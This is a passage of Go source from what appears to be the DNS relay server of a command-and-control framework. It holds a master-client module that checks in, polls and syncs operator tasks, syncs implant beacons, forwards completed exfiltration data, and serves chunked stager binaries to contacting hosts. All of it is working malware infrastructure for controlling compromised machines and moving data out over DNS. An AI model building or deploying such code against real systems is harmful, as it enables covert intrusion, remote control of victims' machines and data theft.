		if len(completedExfil) > 0 && exfilHandler != nil {
			exfilHandler(completedExfil)
		}
		if len(missingChunks) > 0 && missingChunkHandler != nil {
			missingChunkHandler(missingChunks)
		}
		if len(buildFormats) > 0 && buildFormatHandler != nil {
			buildFormatHandler(buildFormats)
		}
		if len(buildPhaseConfigs) > 0 && buildPhaseConfigHandler != nil {
			buildPhaseConfigHandler(buildPhaseConfigs)
		}
	}

	doCheckin()

	ticker := time.NewTicker(interval)
	go func() {
		for range ticker.C {
			doCheckin()
		}
	}()
}

// StartPeriodicTaskPoll starts a background goroutine for polling tasks
func (mc *MasterClient) StartPeriodicTaskPoll(interval time.Duration, taskHandler func([]TaskResponse)) {
	ticker := time.NewTicker(interval)
	go func() {
		for range ticker.C {
			tasks, err := mc.PollTasks()
			if err != nil {
				if mc.debug {
					logf("[Master Client] Task poll error: %v", err)
				}
				continue
			}

			if len(tasks) > 0 {
				taskHandler(tasks)
			}
		}
	}()
}

// StartPeriodicBeaconSync starts a background goroutine for syncing beacons from master
func (mc *MasterClient) StartPeriodicBeaconSync(interval time.Duration, beaconHandler func([]BeaconData)) {
	doSync := func() {
		beacons, err := mc.SyncBeacons()
		if err != nil {
			if mc.debug {
				logf("[Master Client] Beacon sync error: %v", err)
			}
			return
		}
		if len(beacons) > 0 {
			beaconHandler(beacons)
		}
	}

	doSync()

	ticker := time.NewTicker(interval)
	go func() {
		for range ticker.C {
			doSync()
		}
	}()
}

// SyncTaskStatuses fetches completed/failed task statuses from Master
// This allows DNS servers to clear beacon.CurrentTask when tasks complete
func (mc *MasterClient) SyncTaskStatuses() ([]TaskResponse, error) {
	// Build query string with authentication - only get completed/failed tasks
	endpoint := fmt.Sprintf("/api/dns-server/task-statuses?dns_server_id=%s&api_key=%s", mc.serverID, mc.apiKey)

	respData, err := mc.doRequest("GET", endpoint, nil)
	if err != nil {
		return nil, fmt.Errorf("task status sync failed: %w", err)
	}

	// Parse response as task array
	var tasks []TaskResponse
	if err := json.Unmarshal(respData, &tasks); err != nil {
		return nil, fmt.Errorf("failed to parse task statuses response: %w", err)
	}

	if mc.debug && len(tasks) > 0 {
		logf("[Master Client] Synced %d task status update(s) from master", len(tasks))
	}

	return tasks, nil
}

// StartPeriodicTaskStatusSync starts a background goroutine for syncing completed task statuses
func (mc *MasterClient) StartPeriodicTaskStatusSync(interval time.Duration, statusHandler func([]TaskResponse)) {
	ticker := time.NewTicker(interval)
	go func() {
		for range ticker.C {
			tasks, err := mc.SyncTaskStatuses()
			if err != nil {
				if mc.debug {
					logf("[Master Client] Task status sync error: %v", err)
				}
				continue
			}

			if len(tasks) > 0 {
				statusHandler(tasks)
			}
		}
	}()
}

// GetLastCheckin returns the timestamp of the last successful check-in
func (mc *MasterClient) GetLastCheckin() time.Time {
	mc.checkinMutex.RLock()
	defer mc.checkinMutex.RUnlock()
	return mc.lastCheckin
}

// IsConnected checks if the master client has successfully checked in recently
func (mc *MasterClient) IsConnected() bool {
	mc.checkinMutex.RLock()
	defer mc.checkinMutex.RUnlock()

	// Consider connected if checked in within last 5 minutes
	return time.Since(mc.lastCheckin) < 5*time.Minute
}

// Stager session support

// StagerSessionInfo contains information about a stager deployment session
type StagerSessionInfo struct {
	SessionID   string   `json:"session_id"`
	TotalChunks int      `json:"total_chunks"`
	DNSDomains  []string `json:"dns_domains"`
	ChunkSize   int      `json:"chunk_size"`
}

// StagerChunkResponse contains chunk data from Master
type StagerChunkResponse struct {
	ChunkIndex int    `json:"chunk_index"`
	ChunkData  string `json:"chunk_data"`
	Success    bool   `json:"success"`
	Message    string `json:"message,omitempty"`
}

// InitStagerSession forwards a stager initialization request to Master
func (mc *MasterClient) InitStagerSession(stagerIP, os, arch string) (*StagerSessionInfo, error) {
	req := map[string]interface{}{
		"dns_server_id": mc.serverID,
		"api_key":       mc.apiKey,
		"stager_ip":     stagerIP,
		"os":            os,
		"arch":          arch,
	}

	respData, err := mc.doRequest("POST", "/api/dns-server/stager/init", req)
	if err != nil {
		return nil, fmt.Errorf("stager init failed: %w", err)
	}

	var sessionInfo StagerSessionInfo
	if err := json.Unmarshal(respData, &sessionInfo); err != nil {
		return nil, fmt.Errorf("failed to parse stager init response: %w", err)
	}

	return &sessionInfo, nil
}

// GetStagerChunk requests a specific chunk from Master for a stager session
func (mc *MasterClient) GetStagerChunk(sessionID string, chunkIndex int, stagerIP string) (*StagerChunkResponse, error) {
	req := map[string]interface{}{
		"dns_server_id": mc.serverID,
		"api_key":       mc.apiKey,
		"session_id":    sessionID,
		"chunk_index":   chunkIndex,
		"stager_ip":     stagerIP,
	}

	respData, err := mc.doRequest("POST", "/api/dns-server/stager/chunk", req)
	if err != nil {
		return nil, fmt.Errorf("stager chunk request failed: %w", err)
	}

	var chunkResp StagerChunkResponse
	if err := json.Unmarshal(respData, &chunkResp); err != nil {
		return nil, fmt.Errorf("failed to parse stager chunk response: %w", err)
	}

	if !chunkResp.Success {
		return nil, fmt.Errorf("chunk not available: %s", chunkResp.Message)
	}

	return &chunkResp, nil
}

// NotifyStagerContact informs Master about a stager using cached binary (async, fire-and-forget)
func (mc *MasterClient) NotifyStagerContact(stagerIP, os, arch, clientBinaryID string, totalChunks int) {
	req := map[string]interface{}{
		"dns_server_id":    mc.serverID,
		"api_key":          mc.apiKey,
		"stager_ip":        stagerIP,
		"os":               os,
		"arch":             arch,
		"client_binary_id": clientBinaryID,
		"total_chunks":     totalChunks,
	}

	_, err := mc.doRequest("POST", "/api/dns-server/stager/contact", req)
	if err != nil && mc.debug {
		logf("[Master Client] Failed to notify stager contact: %v", err)
	}
}

// GetTaskStatus queries the Master for the current status of a task
// This allows DNS servers to check if tasks were completed on other servers
func (mc *MasterClient) GetTaskStatus(taskID string) (string, error) {
	endpoint := fmt.Sprintf("/api/tasks/%s/status?dns_server_id=%s&api_key=%s", taskID, mc.serverID, mc.apiKey)

	respData, err := mc.doRequest("GET", endpoint, nil)
	if err != nil {
		return "", fmt.Errorf("task status query failed: %w", err)
	}

	var resp struct {
		Status string `json:"status"`
	}

	if err := json.Unmarshal(respData, &resp); err != nil {
		return "", fmt.Errorf("failed to parse task status response: %w", err)
	}

	return resp.Status, nil
}
